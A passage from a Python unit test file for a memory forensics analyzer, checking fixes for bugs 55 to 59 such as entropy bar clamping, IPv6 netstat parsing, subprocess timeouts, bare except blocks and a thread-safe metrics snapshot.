        """Bug 55: report generator must clamp entropy bar width to 100%."""
        from report_generator import generate_enterprise_html_report
        source = inspect.getsource(generate_enterprise_html_report)
        self.assertIn('min(100', source,
                      "Entropy bar width must be capped with min(100, ...) to prevent overflow")

    def test_entropy_bar_width_formula(self):
        """Bug 55: entropy = 8.01 should produce width <= 100%."""
        # The formula: min(100, e['entropy']/8*100)
        entropy = 8.01
        width = min(100, entropy / 8 * 100)
        self.assertLessEqual(width, 100,
                             f"Entropy {entropy} should produce width <= 100%, got {width}%")


# ═══════════════════════════════════════════════════════════════
#  BUG 56: Netstat TCPv6/UDPv6 connections not parsed
# ═══════════════════════════════════════════════════════════════

class TestBug56NetstatIPv6(unittest.TestCase):
    """Bug 56: _get_current_connections() skipped TCPv6 and UDPv6 protocol lines."""

    def test_source_accepts_tcpv6(self):
        """The netstat parser must accept 'TCPv6' as a valid protocol."""
        import inspect
        from memory_forensics_tool import MemoryForensicsGUI
        source = inspect.getsource(MemoryForensicsGUI._get_current_connections)
        self.assertIn("'TCPv6'", source, "TCPv6 must be accepted as valid protocol")

    def test_source_accepts_udpv6(self):
        """The netstat parser must accept 'UDPv6' as a valid protocol."""
        import inspect
        from memory_forensics_tool import MemoryForensicsGUI
        source = inspect.getsource(MemoryForensicsGUI._get_current_connections)
        self.assertIn("'UDPv6'", source, "UDPv6 must be accepted as valid protocol")


# ═══════════════════════════════════════════════════════════════
#  BUG 57: Missing timeout on fallback tasklist subprocess call
# ═══════════════════════════════════════════════════════════════

class TestBug57SubprocessTimeout(unittest.TestCase):
    """Bug 57: Fallback tasklist in create_memory_dump lacked timeout parameter."""

    def test_all_subprocess_run_have_timeout(self):
        """Every subprocess.run call should have a timeout parameter."""
        import inspect, re
        from memory_forensics_tool import MemoryForensicsGUI
        source = inspect.getsource(MemoryForensicsGUI)
        # Find all subprocess.run calls and check each has 'timeout='
        # Use multiline to find subprocess.run( ... ) blocks
        calls = list(re.finditer(r'subprocess\.run\(', source))
        self.assertGreater(len(calls), 0, "Should find subprocess.run calls")
        for match in calls:
            # Get the text from the call start to the next closing paren at same depth
            start = match.start()
            # Look for 'timeout=' within 400 chars (covers multi-line calls)
            chunk = source[start:start+400]
            self.assertIn('timeout=', chunk,
                f"subprocess.run call at offset {start} missing timeout parameter: {chunk[:100]}...")


# ═══════════════════════════════════════════════════════════════
#  BUG 58: Bare except: blocks swallow KeyboardInterrupt
# ═══════════════════════════════════════════════════════════════

class TestBug58BareExcept(unittest.TestCase):
    """Bug 58: Bare 'except:' blocks catch BaseException including KeyboardInterrupt."""

    def test_no_bare_except_in_main(self):
        """memory_forensics_tool.py should have no bare 'except:' blocks."""
        import re
        source_path = os.path.join(os.path.dirname(__file__), 'memory_forensics_tool.py')
        with open(source_path, 'r', encoding='utf-8') as f:
            source = f.read()
        # Match lines that are just 'except:' with optional whitespace
        bare_excepts = re.findall(r'^\s+except:\s*$', source, re.MULTILINE)
        self.assertEqual(len(bare_excepts), 0,
            f"Found {len(bare_excepts)} bare 'except:' blocks — use 'except Exception:' instead")


# ═══════════════════════════════════════════════════════════════
#  BUG 59: _process_metrics race condition — snapshot needed
# ═══════════════════════════════════════════════════════════════

class TestBug59MetricsSnapshot(unittest.TestCase):
    """Bug 59: _update_process_display should use metrics snapshot, not live dict."""

    def test_update_process_display_accepts_metrics_param(self):
        """_update_process_display must accept optional metrics parameter."""
        import inspect
        from memory_forensics_tool import MemoryForensicsGUI
        sig = inspect.signature(MemoryForensicsGUI._update_process_display)
        params = list(sig.parameters.keys())
        self.assertIn('metrics', params,
            "_update_process_display must accept 'metrics' parameter for thread-safe snapshot")

    def test_monitor_loop_creates_snapshot(self):
        """_realtime_monitor_loop should create metrics_snapshot before scheduling UI update."""
        import inspect
        from memory_forensics_tool import MemoryForensicsGUI
        source = inspect.getsource(MemoryForensicsGUI._realtime_monitor_loop)
        self.assertIn('metrics_snapshot', source,
            "Monitor loop must create metrics_snapshot before scheduling _update_process_display")
        # Verify snapshot is passed to the lambda
        self.assertIn('ms=metrics_snapshot', source,
            "Monitor loop must pass metrics_snapshot via default arg to lambda")


# ═══════════════════════════════════════════════════════════════
#  MAIN
# ═══════════════════════════════════════════════════════════════

if __name__ == '__main__':
    # Print header
    print("=" * 70)
    print("   ULTRA-DEEP TEST SUITE v3.5")
    print("   Memory Forensics Analyzer — Comprehensive Testing")
    print("=" * 70)
    print()

    # Verify test dump exists
    if not os.path.exists(TEST_DUMP):
        print(f"[!] Test dump not found: {TEST_DUMP}")
        print("    Run generate_test_dump.py first!")
        sys.exit(1)

    print(f"[+] Test dump: {TEST_DUMP} ({os.path.getsize(TEST_DUMP):,} bytes)")
    print()

    # Run tests
    unittest.main(verbosity=2)
